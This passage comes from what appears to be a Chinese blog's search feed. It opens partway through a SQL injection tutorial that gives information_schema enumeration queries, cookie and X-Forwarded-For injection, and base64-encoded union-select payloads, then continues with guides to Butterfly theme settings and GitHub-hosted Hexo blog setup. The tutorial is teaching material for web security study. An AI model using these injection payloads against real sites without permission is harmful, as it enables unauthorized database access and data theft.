class="line">#获取字段名，这里使用了三层嵌套，第一层是table_schema，他代表苦命的嵌套，第二层和第三层是table_name的嵌套，我们可以看到语句中有两个limit，前一个limit控制表名的顺序，后一个limit控制字段名的顺序</span><br><span class="line">select column_name from information_schema.columns where table_schema=(select database()) and table_name=(select table_name from information_schema.tables where table_schema=(select database()) limit 0,1)limit 0,1</span><br></pre></td></tr></table></figure><h2 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h2><p>总体流程和union注入一样，不一样的点在于，不是在url处返回id&#x3D;1，而是在cookie处返回url等于1。</p><h2 id="base64注入"><a href="#base64注入" class="headerlink" title="base64注入"></a>base64注入</h2><p>总体流程和union注入一样，不一样的点在于，ID参数被base64位编码了，我们的查询语句要经过base64位编码。(%3d是url编码)</p><h3 id="流程-7"><a href="#流程-7" class="headerlink" title="流程"></a>流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#获取长度</span><br><span class="line">id=MSBvcmRlciBieSA0</span><br><span class="line"></span><br><span class="line">#确定位置,后续语句将1，2，3中某个可用数字更改为(该语句)</span><br><span class="line">id=LTEnIHVuaW9uIHNlbGVjdCAxLDIsMw==      </span><br><span class="line"></span><br><span class="line">#库名</span><br><span class="line">c2VsZWN0IFNDSEVNQV9OQU1FIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLlNDSEVNQVRBIGxpbWl0IDAsMQ==</span><br><span class="line"></span><br><span class="line">#表名</span><br><span class="line">c2VsZWN0IHRhYmxlX25hbWUgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nbXlzcWwnIGxpbWl0IDAsMQ==</span><br><span class="line"></span><br><span class="line">#字段名</span><br><span class="line">c2VsZWN0IGNvbHVtbl9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hPSdteXNxbCcgYW5kIHRhYmxlX25hbWU9J3VzZXJuYW1lcycgbGltaXQgMCwxICAgIA==        </span><br><span class="line"></span><br><span class="line">#具体值</span><br><span class="line">c2VsZWN0IHVzZXJuYW1lX2lkIGZyb20gbXlzcWwudXNlcm5hbWVzIGxpbWl0IDAsMQ==</span><br></pre></td></tr></table></figure><h2 id="XFF注入"><a href="#XFF注入" class="headerlink" title="XFF注入"></a>XFF注入</h2><p>如果http请求头有一个头部参数为X-Forwarded-for(简称XFF头)，他代表了客户端真实ip，通过修改XFF值可以伪造客户端ip，如果将XFF设置为127.0.0.1，然后访问该url页面返回正常。</p><p>之后尝试将127.0.0.1加上’,即127.0.0.1’再次访问，页面返回报错信息，之后通过and 1&#x3D;1#和and 1&#x3D;2#再次访问判断是否存在SQL注入，之后使用union注入的方法完成注入。</p><blockquote><p>[!NOTE]</p><p>文章内容参考《web安全攻防》第一版，后续可能会有变动。</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Butterfly主题美化</title>
      <link href="/2024/07/17/Butterfly%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/"/>
      <url>/2024/07/17/Butterfly%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="一、butterfly主题下载与主题更换"><a href="#一、butterfly主题下载与主题更换" class="headerlink" title="一、butterfly主题下载与主题更换"></a>一、butterfly主题下载与主题更换</h2><h3 id="在hexo根目录下输入以下命令进行下载"><a href="#在hexo根目录下输入以下命令进行下载" class="headerlink" title="在hexo根目录下输入以下命令进行下载"></a>在hexo根目录下输入以下命令进行下载</h3><p>git下载方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>npm下载方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-theme-butterfly</span><br></pre></td></tr></table></figure><h3 id="修改根目录-config-yml主题"><a href="#修改根目录-config-yml主题" class="headerlink" title="修改根目录_config.yml主题"></a>修改根目录_config.yml主题</h3><p>查找theme关键字，将默认主题修改为butterfly</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><h3 id="主题配置文件"><a href="#主题配置文件" class="headerlink" title="主题配置文件"></a>主题配置文件</h3><p>新建主题盘配置文件**_config.butterfly.yml<strong>，并将theme文件夹下主题配置文件</strong>_config..yml<strong>内容复制粘贴在</strong>_config.butterfly.yml**中。</p><h2 id="二、修改网站主页信息"><a href="#二、修改网站主页信息" class="headerlink" title="二、修改网站主页信息"></a>二、修改网站主页信息</h2><h3 id="导航栏"><a href="#导航栏" class="headerlink" title="导航栏"></a>导航栏</h3><p>将先要添加的目录注释解除掉，并输入以下命令新建相关目录文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">\# Menu 目錄</span><br><span class="line"></span><br><span class="line">menu:</span><br><span class="line"></span><br><span class="line"> 首页: / || fas fa-home</span><br><span class="line"></span><br><span class="line"> 归档: /archives/ || fas fa-archive</span><br><span class="line"></span><br><span class="line"> 标签: /tags/ || fas fa-tags</span><br><span class="line"></span><br><span class="line"> 分类: /categories/ || fas fa-folder-open</span><br><span class="line"></span><br><span class="line"> \# 清单||fas fa-list:</span><br><span class="line"></span><br><span class="line">  \# 音乐: /music/ || fas fa-music</span><br><span class="line"></span><br><span class="line"> \#  电影: /movies/ || fas fa-video</span><br><span class="line"></span><br><span class="line"> 友链: /link/ || fas fa-link</span><br><span class="line"></span><br><span class="line"> 关于: /about/ || fas fa-heart</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page xxx</span><br></pre></td></tr></table></figure><h3 id="社交图标"><a href="#社交图标" class="headerlink" title="社交图标"></a>社交图标</h3><p>取消注释并修改相关链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">social:</span><br><span class="line">  fab fa-github: https://github.com/xxxxx || Github || &quot;#hdhfbb&quot;</span><br><span class="line">  fas fa-envelope: mailto:xxxxxx@gmail.com || Email || &quot;#000000&quot;</span><br></pre></td></tr></table></figure><h3 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h3><p>在站点根目录&#x2F;source下新建img文件夹，将要使用的图片放入，之后修改下列配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">avatar:</span><br><span class="line">  img: /img/avatar.png</span><br><span class="line">  effect: false # 头像一直转圈</span><br></pre></td></tr></table></figure><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><h4 id="代码复制"><a href="#代码复制" class="headerlink" title="代码复制"></a>代码复制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_copy: true</span><br></pre></td></tr></table></figure><h4 id="代码高度限制"><a href="#代码高度限制" class="headerlink" title="代码高度限制"></a>代码高度限制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_height_limit: false # unit: px（修改时写入数字）    </span><br></pre></td></tr></table></figure><h3 id="文章"><a href="#文章" class="headerlink" title="文章"></a>文章</h3><h4 id="文章封面"><a href="#文章封面" class="headerlink" title="文章封面"></a>文章封面</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#显示文章相关信息 </span><br><span class="line">post_meta:</span><br><span class="line">  page:</span><br><span class="line">    date_type: both # created or updated or both 主頁文章日期是創建日或者更新日或都顯示</span><br><span class="line">    date_format: relative # date/relative 顯示日期還是相對日期</span><br><span class="line">    categories: true # true or false 主頁是否顯示分類</span><br><span class="line">    tags: true # true or false 主頁是否顯示標籤</span><br><span class="line">    label: true # true or false 顯示描述性文字</span><br><span class="line">  post:</span><br><span class="line">    date_type: both # created or updated or both 文章頁日期是創建日或者更新日或都顯示</span><br><span class="line">    date_format: relative # date/relative 顯示日期還是相對日期</span><br><span class="line">    categories: true # true or false 文章頁是否顯示分類</span><br><span class="line">    tags: true # true or false 文章頁是否顯示標籤</span><br><span class="line">    label: true # true or false 顯示描述性文字</span><br></pre></td></tr></table></figure><h4 id="版权信息"><a href="#版权信息" class="headerlink" title="版权信息"></a>版权信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># copy settings</span><br><span class="line"># copyright: Add the copyright information after copied content (复制文章后加入版权信息)</span><br><span class="line">copy:</span><br><span class="line">  enable: true</span><br><span class="line">  copyright:</span><br><span class="line">    enable: true</span><br><span class="line">    limit_count: 50</span><br></pre></td></tr></table></figure><h4 id="文章过期提醒"><a href="#文章过期提醒" class="headerlink" title="文章过期提醒"></a>文章过期提醒</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Displays outdated notice for a post (文章過期提醒) #</span><br><span class="line"></span><br><span class="line">noticeOutdate:</span><br><span class="line">  enable: true</span><br><span class="line">  style: flat # style: simple/flat</span><br><span class="line">  limit_day: 365 # When will it be shown</span><br><span class="line">  position: top # position: top/bottom</span><br><span class="line">  message_prev: It has been</span><br><span class="line">  message_next: days since the last update, the content of the article may be outdated.</span><br></pre></td></tr></table></figure><h4 id="文章分页"><a href="#文章分页" class="headerlink" title="文章分页"></a>文章分页</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># post_pagination (分頁)</span><br><span class="line"># value: 1 || 2 || false</span><br><span class="line"># 1: The &#x27;next post&#x27; will link to old post</span><br><span class="line"># 2: The &#x27;next post&#x27; will link to new post</span><br><span class="line"># false: disable pagination</span><br><span class="line">post_pagination: false</span><br></pre></td></tr></table></figure><h3 id="页面美化"><a href="#页面美化" class="headerlink" title="页面美化"></a>页面美化</h3><h4 id="页脚自定义文本"><a href="#页脚自定义文本" class="headerlink" title="页脚自定义文本"></a>页脚自定义文本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">custom_text: Hi, welcome to my &lt;a href=&quot;https://butterfly.js.org/&quot;&gt;blog&lt;/a&gt;!</span><br></pre></td></tr></table></figure><h4 id="公告栏"><a href="#公告栏" class="headerlink" title="公告栏"></a>公告栏</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">card_announcement:</span><br><span class="line"> enable: true</span><br><span class="line"> content: 欢迎来到ourobrosの博客</span><br></pre></td></tr></table></figure><h4 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">comments:</span><br><span class="line"></span><br><span class="line">  # Up to two comments system, the first will be shown as default</span><br><span class="line"></span><br><span class="line">  # Choose: Disqus/Disqusjs/Livere/Gitalk/Valine/Waline/Utterances/Facebook Comments/Twikoo/Giscus/Remark42/Artalk</span><br><span class="line"></span><br><span class="line">  use: # Valine,Disqus</span><br><span class="line">  text: true # Display the comment name next to the button</span><br><span class="line"></span><br><span class="line">  # lazyload: The comment system will be load when comment element enters the browser&#x27;s viewport.</span><br><span class="line"></span><br><span class="line">  # If you set it to true, the comment count will be invalid</span><br><span class="line"></span><br><span class="line">  lazyload: true</span><br><span class="line">  count: true # Display comment count in post&#x27;s top_img</span><br><span class="line">  card_post_count: false # Display comment count in Home Page</span><br></pre></td></tr></table></figure><h4 id="页面美化-1"><a href="#页面美化-1" class="headerlink" title="页面美化"></a>页面美化</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">\# Beautify (美化頁面顯示)</span><br><span class="line"></span><br><span class="line">beautify:</span><br><span class="line"></span><br><span class="line"> enable: true</span><br><span class="line"></span><br><span class="line"> field: post # site/post</span><br><span class="line"></span><br><span class="line"> title-prefix-icon: # &#x27;\f0c1&#x27;</span><br><span class="line"></span><br><span class="line"> title-prefix-icon-color: # &#x27;#F47466&#x27;</span><br></pre></td></tr></table></figure><h3 id="主题魔改参考教程"><a href="#主题魔改参考教程" class="headerlink" title="主题魔改参考教程"></a>主题魔改参考教程</h3><p><a href="https://www.fomal.cc/">https://www.fomal.cc/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Blog </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo个人博客搭建</title>
      <link href="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h2 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h2><h3 id="node-js"><a href="#node-js" class="headerlink" title="node.js"></a>node.js</h3><h4 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h4><p>node.js官网：<a href="https://nodejs.org/zh-cn">https://nodejs.org/zh-cn</a></p><p>Hexo 是一款基于 node.js的静态博客框架,所以需要配置好node.js环境。</p><h4 id="2-环境配置步骤"><a href="#2-环境配置步骤" class="headerlink" title="2.环境配置步骤"></a>2.环境配置步骤</h4><p>首先去node.js官网下载稳定的预构建安装程序，之后新建文件夹将安装程序放入，启动过程中可以更改文件储存路径（虽然但是还是不建议放c盘）</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713115547618.png" class="" title="image-20240713115547618"><p>然后在电脑设置中搜索高级系统设置，点击环境变量。这时你会发现预安装程序已经将node.js的环境变量写入系统变量（环境变量）了。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120605794.png" class="" title="image-20240713120605794"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120307907.png" class="" title="image-20240713120307907"><style>.crctdexzrddi{zoom:80%;}</style><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120057786.png" class="crctdexzrddi" alt="image-20240713120057786"><p>之后点击win+R，输入cmd，打开终端输入node -v和npm -v查看版本，发现已经出现版本号。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120826444.png" class="" title="image-20240713120826444"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120909905.png" class="" title="image-20240713120909905"><p>之后在存储node.js的文件夹中新建两个文件夹【node_global】和【node_cache】</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713121043654.png" class="" title="image-20240713121043654"><p>之后在用户变量的PATH里，将默认的 C:APPData\Roaming\npm 修改成 C:\Program Files\nodejs\node_global</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713121507254.png" class="" title="image-20240713121507254"><p>完成后我们退出来，在系统变量处新建一个NODE_PATH,并写入</p><p>G:\xxx（自己保存node.js的文件夹位置）\node.js\node_global\node_modules</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713120653380.png" class="" title="image-20240713120653380"><p>之后我们进入系统变量的PATH里新建一个变量%NODE_PATH%，还有另外两个变量%NODE_PATH%\node_cache和%NODE_PATH%\node_global</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713121840722.png" class="" title="image-20240713121840722"><p>然后进行测试：npm install express -g   &#x2F;&#x2F; -g是全局安装的意思，尝试下载看是否报错。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713121936785.png" class="" title="image-20240713121936785"><p>没有梯子就更换国内镜像源：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure><h3 id="GIT"><a href="#GIT" class="headerlink" title="GIT"></a>GIT</h3><p>下载地址：<a href="https://git-scm.com/download">https://git-scm.com/download</a></p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713122258697.png" class="" title="image-20240713122258697"><p>之后将下载的预安装包找一个文件夹放，之后除了安装路径，无脑下一步就行，想改文末有参考教程，很详细。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713122552506.png" class="" title="image-20240713122552506"><p>git的使用：鼠标右键文件夹，如果没有git bash，如下图，就点击显示更多选项</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713122855110.png" class="" title="image-20240713122855110"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713123006602.png" class="" title="image-20240713123006602"><h2 id="二、hexo下载"><a href="#二、hexo下载" class="headerlink" title="二、hexo下载"></a>二、hexo下载</h2><p>我们这里建议新建一个文件夹，放hexo，之后git bash打开位置放在hexo文件夹中，之后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-cli#如果出现报错，尝试在命令前加上npx，下文hexo内容同理</span><br></pre></td></tr></table></figure><p>下载完成之后输入 hexo -v查看版本，有版本显示就说明下载完成。</p><p>之后进入hexo文件夹中，输入一下命令初始化文件夹。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init </span><br></pre></td></tr></table></figure><p>这样本地的网站配置也弄好啦，输入【hexo g】生成静态网页，然后输入【hexo s】打开本地服务器（ctrl+c关闭本地服务器），之后就可以在浏览器的url栏输入localhost:4000，本地博客就搭建完成了。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713123656676.png" class="" title="image-20240713123656676"><h2 id="三、github托管"><a href="#三、github托管" class="headerlink" title="三、github托管"></a>三、github托管</h2><p>注册一个github账号：<a href="https://github.com/">https://github.com/</a></p><p>新建一个仓库，your repositories，新建一个仓库。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713124009896.png" class="" title="image-20240713124009896"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713124104126.png" class="" title="image-20240713124104126"><p>填写内容如下，选一个喜欢的名字但是后缀不能改变。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713124421405.png" class="" title="image-20240713124421405"><h4 id="ssh私钥连接"><a href="#ssh私钥连接" class="headerlink" title="ssh私钥连接"></a>ssh私钥连接</h4><p>在git bash输入以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#第一次使用git后需要将用户名和邮箱进行初始化</span><br><span class="line"></span><br><span class="line">git config --global user.name &quot;yourname&quot; </span><br><span class="line">git config --global user.email &quot;youremail&quot;</span><br></pre></td></tr></table></figure><p>用以下命令检查是否输对</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config user.name</span><br><span class="line"></span><br><span class="line"> git config user.email</span><br></pre></td></tr></table></figure><p>然后一直回车（enter），之后输入以下命令进行邮箱验证。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;youremail&quot;</span><br></pre></td></tr></table></figure><p>之后电脑c盘&#x2F;用户&#x2F;电脑用户名，文件夹中会出现一个.ssh文件夹，如下图，右键记事本打开其中的id_rsa.pub，复制所有内容。</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125128617.png" class="" title="image-20240713125128617"><p>之后来到github，点击头像，点击setting，在ssh和gpg key里点击NEW ssh key，之后输入复制的内容（名字随便起）</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125250712.png" class="" title="image-20240713125250712"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125342974.png" class="" title="image-20240713125342974"><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125430180.png" class="" title="image-20240713125430180"><p>之后在git bash里输入ssh -T <a href="mailto:&#103;&#105;&#x74;&#64;&#103;&#105;&#x74;&#x68;&#117;&#x62;&#46;&#99;&#111;&#109;">&#103;&#105;&#x74;&#64;&#103;&#105;&#x74;&#x68;&#117;&#x62;&#46;&#99;&#111;&#109;</a>，如果出现下图（你的用户名），就说明成功</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713125606931.png" class="" title="image-20240713125606931"><p>之后我们就可以配置hexo文件夹中的_confing.yml配置文件了，repository修改为你自己的github项目地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># URL</span><br><span class="line">## Set your site url here. For example, if you use GitHub Page, set url as &#x27;https://username.github.io/project&#x27;</span><br><span class="line">url: https://hackingtree.github.io/Blog.github.io/</span><br><span class="line">permalink: :year/:month/:day/:title/</span><br><span class="line">permalink_defaults:</span><br><span class="line">pretty_urls:</span><br><span class="line">  trailing_index: true # Set to false to remove trailing &#x27;index.html&#x27; from permalinks</span><br><span class="line">  trailing_html: true # Set to false to remove trailing &#x27;.html&#x27; from permalinks</span><br></pre></td></tr></table></figure><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240714214124767.png" class="" title="image-20240714214124767"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:  </span><br><span class="line">  type: git  </span><br><span class="line">  repository: https://github.com/xxx（用户名）/xxx.github.io.git （见下图）</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713130104371.png" class="" title="image-20240713130104371"><p>或者</p><img src="/2024/07/17/Hexo%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/image-20240713130128677.png" class="" title="image-20240713130128677"><p>之后输入以下命令，下载插件，将生成网页通过git方式上传到你对应的链接仓库中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><p>之后输入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo clean </span><br><span class="line"></span><br><span class="line">hexo g （generate） </span><br><span class="line"></span><br><span class="line">hexo d （deploy）</span><br></pre></td></tr></table></figure><p>将配置文件上传到git仓库中，这三个命令一般都是一起使用的</p><p>第一次hexo d的时候可能会有密码（你的github密码）</p><p>之后访问<a href="https://github.com/xxx%EF%BC%88%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%89/xxx.github.io.git%E5%B0%B1%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E4%BD%A0%E7%9A%84%E5%8D%9A%E5%AE%A2%E4%BA%86%E3%80%82">https://github.com/xxx（用户名）/xxx.github.io.git就可以访问你的博客了。</a></p><h2 id="四、next主题配置"><a href="#四、next主题配置" class="headerlink" title="四、next主题配置"></a>四、next主题配置</h2><p>参考链接<a href="https://blog.csdn.net/as480133937/article/details/100138838">Hexo-Next 主题博客个性化配置超详细，超全面(两万字)_hexo next 记录访问了ip-CSDN博客</a></p><p>参考链接<a href="https://iitii.github.io/2021/05/28/1/#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%96%87%E4%BB%B6%E7%9A%84%E8%B7%AF%E5%BE%84">Hexo Next 主题安装、配置及美化 | Hello Memo (iitii.github.io)</a></p><p>文章参考和部分图片来源：</p><p>node.js下载和环境配置：<a href="http://t.csdnimg.cn/GpuGX">http://t.csdnimg.cn/GpuGX</a></p><p>git下载和环境配置：<a href="http://t.csdnimg.cn/cuSYy">http://t.csdnimg.cn/cuSYy</a></p><p>hexo+git个人博客搭建：<a href="http://t.csdnimg.cn/7UFPd">http://t.csdnimg.cn/7UFPd</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> Blog </tag>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
